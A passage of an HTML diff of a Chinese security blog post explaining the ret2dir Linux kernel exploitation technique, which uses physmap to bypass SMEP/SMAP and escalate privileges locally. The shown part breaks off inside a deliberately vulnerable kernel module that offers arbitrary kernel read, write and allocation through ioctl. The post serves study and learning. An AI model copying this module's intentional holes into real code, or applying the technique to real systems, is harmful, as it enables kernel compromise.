@@ -1,0 +1,1151 @@
+<!DOCTYPE html>
+<html lang="ch">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="collectcrop">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://collectcrop.github.io/blog/2025/03/09/ret2dir手法学习/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="ret2dir手法学习原理Ret2dir（Return-to-Direct Mapping）是一种 内核利用 技术，攻击者可以利用它 绕过 SMEP、SMAP、pxn 等用户空间与内核空间隔离的防护手段，最终实现 本地提权。 在 大多数 Linux 内核（基于 x86_64 架构） 中，物理地址（Physical Address） 的很大一部分会被 直接映射（direct mapping） 到 内">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ret2dir手法学习">
+<meta property="og:url" content="https://collectcrop.github.io/blog/2025/03/09/ret2dir%E6%89%8B%E6%B3%95%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="Collectcrop&#39;s Blog">
+<meta property="og:description" content="ret2dir手法学习原理Ret2dir（Return-to-Direct Mapping）是一种 内核利用 技术，攻击者可以利用它 绕过 SMEP、SMAP、pxn 等用户空间与内核空间隔离的防护手段，最终实现 本地提权。 在 大多数 Linux 内核（基于 x86_64 架构） 中，物理地址（Physical Address） 的很大一部分会被 直接映射（direct mapping） 到 内">
+<meta property="og:locale">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2025/03/09/ret2dir%E6%89%8B%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20250308231319166.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2025/03/09/ret2dir%E6%89%8B%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20250308232224327.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2025/03/09/ret2dir%E6%89%8B%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20250308232101958.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2025/03/09/ret2dir%E6%89%8B%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20250309121624100.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2025/03/09/ret2dir%E6%89%8B%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20250309133155698.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2025/03/09/ret2dir%E6%89%8B%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20250309134242679.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2025/03/09/ret2dir%E6%89%8B%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20250309155512009.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2025/03/09/ret2dir%E6%89%8B%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20250309162954125.png">
+<meta property="article:published_time" content="2025-03-09T09:07:15.000Z">
+<meta property="article:modified_time" content="2025-03-09T09:07:31.525Z">
+<meta property="article:author" content="collectcrop">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="kernel">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://collectcrop.github.io/blog/2025/03/09/ret2dir%E6%89%8B%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20250308231319166.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/blog/images/redefine-favicon.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/blog/images/redefine-favicon.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/blog/images/redefine-favicon.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            ret2dir手法学习 | Collectcrop&#39;s Blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/blog/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/blog/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/blog/build/css/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/blog/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/blog/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+        
+<script src="/blog/build/js/libs/anime.min.js"></script>
+
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"collectcrop.github.io","root":"/blog/","language":"ch","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":6,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":true,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":true,"custom_message":null},"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Collectcrop's Blog","subtitle":{"text":["Loading..."],"hitokoto":{"enable":true,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/collectcrop","instagram":null,"zhihu":null,"twitter":null,"email":null,"qq":"http://wpa.qq.com/msgrd?v=3&uin=2583727188&site=qq&menu=yes"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.8.1","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags/","icon":"fa-solid fa-tags"},"Categories":{"path":"/categories/","icon":"fa-solid fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Friends":"/links"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":"Just enjoy.","show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"YYYY-MM-DD","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/11/23 15:52:11"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/blog/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/blog/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/blog/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/blog/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+	<span class="scroll-progress-bar"></span>
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    <h2 class="ml13">
+        Collectcrop&#39;s Blog
+    </h2>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+        var animation = anime.timeline({ loop: true })
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [20, 0],
+                translateZ: 0,
+                opacity: [0, 1],
+                filter: ['blur(5px)', 'blur(0px)'],
+                easing: "easeOutExpo",
+                duration: 1200,
+                delay: (el, i) => 300 + 20 * i,
+            })
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [0, -20],
+                opacity: [1, 0],
+                filter: ['blur(0px)', 'blur(5px)'],
+                easing: "easeInExpo",
+                duration: 1000,
+                delay: (el, i) => 15 * i,
+                complete: function() {
+                    hidePreloader();
+                }
+            }, '-=700');
+
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            setTimeout(hidePreloader, 5000); // Call hidePreloader after 5000 milliseconds if not already called by animation
+        });
+
+        function hidePreloader() {
+            var preloader = document.querySelector('.preloader');
+            preloader.style.opacity = '0';
+            setTimeout(function () {
+                preloader.style.display = 'none';
+            }, 200);
+        }
+    </script>
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/blog/">
+                
+                Collectcrop&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/blog/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    首頁
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/blog/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    歸檔
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/blog/tags/"
+                                        >
+                                    <i class="fa-solid fa-tags fa-fw"></i>
+                                    標籤
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/blog/categories/"
+                                        >
+                                    <i class="fa-solid fa-folder fa-fw"></i>
+                                    分類
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown"
+                                   href="#"
+                                        onClick=&#34;return false;&#34;>
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    關於
+                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                        
+                                            <li>
+                                                <a href="/blog/about">
+                                                    ME
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="/blog/links">
+                                                    友情鏈接
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/blog/"
+                        >
+                            <span>
+                                首頁
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/blog/archives"
+                        >
+                            <span>
+                                歸檔
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/blog/tags/"
+                        >
+                            <span>
+                                標籤
+                            </span>
+                            
+                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/blog/categories/"
+                        >
+                            <span>
+                                分類
+                            </span>
+                            
+                                <i class="fa-solid fa-folder fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
+                        
+                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                             navbar-data-toggle="submenu-About"
+                        >
+                            <span>
+                                關於
+                            </span>
+                            
+                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
+                            
+                        </div>
+                        
+
+                        
+                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-About">
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/blog/about">ME</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/blog/links">友情鏈接</a>
+                                    </div>
+                                
+                            </div>
+                        
+                    </li>
+            
+
+            
+            
+                
+                    
+                    
+                    
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/blog/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">27</div>
+        <div class="label text-third-text-color text-sm">標籤</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/blog/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">6</div>
+        <div class="label text-third-text-color text-sm">分類</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/blog/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">20</div>
+        <div class="label text-third-text-color text-sm">文章</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">ret2dir手法学习</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/blog/images/avatar.svg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">collectcrop</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv3</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-03-09 17:07:15</span>
+        <span class="mobile">2025-03-09 17:07:15</span>
+        <span class="hover-info">撰寫</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-03-09 17:07:31</span>
+            <span class="mobile">2025-03-09 17:07:31</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/blog/categories/pwn/">pwn</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/blog/tags/pwn/">pwn</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/blog/tags/kernel/">kernel</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>3.4k 字數</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>16 分鐘</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h2 id="ret2dir手法学习"><a href="#ret2dir手法学习" class="headerlink" title="ret2dir手法学习"></a>ret2dir手法学习</h2><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>Ret2dir（Return-to-Direct Mapping）是一种 <strong>内核利用</strong> 技术，攻击者可以利用它 <strong>绕过 SMEP、SMAP、pxn 等用户空间与内核空间隔离的防护手段</strong>，最终实现 <strong>本地提权</strong>。</p>
+<p>在 <strong>大多数 Linux 内核（基于 x86_64 架构）</strong> 中，<strong>物理地址（Physical Address）</strong> 的很大一部分会被 <strong>直接映射（direct mapping）</strong> 到 <strong>内核虚拟地址空间（Kernel Virtual Address Space）</strong>，即 <code>physmap</code> 区域。这意味着，<strong>用户态（Userland）可以通过某些手段影响物理页</strong>，而内核可能会使用这些页，从而形成攻击面。</p>
+<p>比如我们如果在用户空间大量申请内存，这些内存会停留在 ram 中，也就是会占用实际的物理地址，这些物理内存是会被physmap映射的，那么我们就能够通过改用户空间的内存，在内核空间布置<strong>ROP链</strong>（高版本有不可执行，所以不能直接布置shellcode），然后在内核空间劫持程序执行流到对应的ROP链即可。</p>
+<h4 id="Case-Study"><a href="#Case-Study" class="headerlink" title="Case Study"></a>Case Study</h4><p>这里先参照<a class="link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/185408" >这篇文章<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>自己搭个内核环境以及编写一个具有漏洞的模块进行学习。我们先写一个自己的内核模块，这里注册了一个叫做<strong>kpwn</strong>的misc设备以便之后用ioctl方式进行交互。这个模块提供了任意地址读、任意地址写、任意分配和回收内存的功能，以方便进行ret2dir的原理验证。</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/cdev.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/uaccess.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/miscdevice.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/delay.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;Dual BSD/GPL&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> READ_ANY  0x1111</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WRITE_ANY 0x2222</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADD_ANY   0x3333</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEL_ANY   0x4444</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in_args</span>&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> addr;</span><br><span class="line">    <span class="type">uint64_t</span> size;</span><br><span class="line">    <span class="type">char</span> __user *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">read_any</span><span class="params">(<span class="keyword">struct</span> in_args *args)</span>&#123;         <span class="comment">//任意读取内核地址，可以内存搜索</span></span><br><span class="line">    <span class="type">long</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> *addr = (<span class="type">void</span> *)args-&gt;addr;</span><br><span class="line">    <span class="keyword">if</span>(copy_to_user(args-&gt;buf,addr,args-&gt;size))&#123;</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">write_any</span><span class="params">(<span class="keyword">struct</span> in_args *args)</span>&#123;        <span class="comment">//任意改写内核地址</span></span><br><span class="line">    <span class="type">long</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> *addr = (<span class="type">void</span> *)args-&gt;addr;</span><br><span class="line">    <span class="keyword">if</span>(copy_from_user(addr,args-&gt;buf,args-&gt;size))&#123;</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">add_any</span><span class="params">(<span class="keyword">struct</span> in_args *args)</span>&#123;          <span class="comment">//任意申请内核地址并返回给用户态</span></span><br><span class="line">    <span class="type">long</span> ret = <span class="number">0</span>;       </span><br><span class="line">    <span class="type">char</span> *buffer = kmalloc(args-&gt;size,GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span>(buffer == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> 